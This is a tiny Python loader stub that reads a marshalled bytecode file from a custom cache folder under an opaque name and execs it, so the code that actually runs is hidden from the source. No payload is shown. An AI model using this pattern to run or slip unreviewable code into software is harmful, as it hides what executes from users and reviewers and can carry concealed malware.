
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_20bbcc7479364d3498a66da98182ae64.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
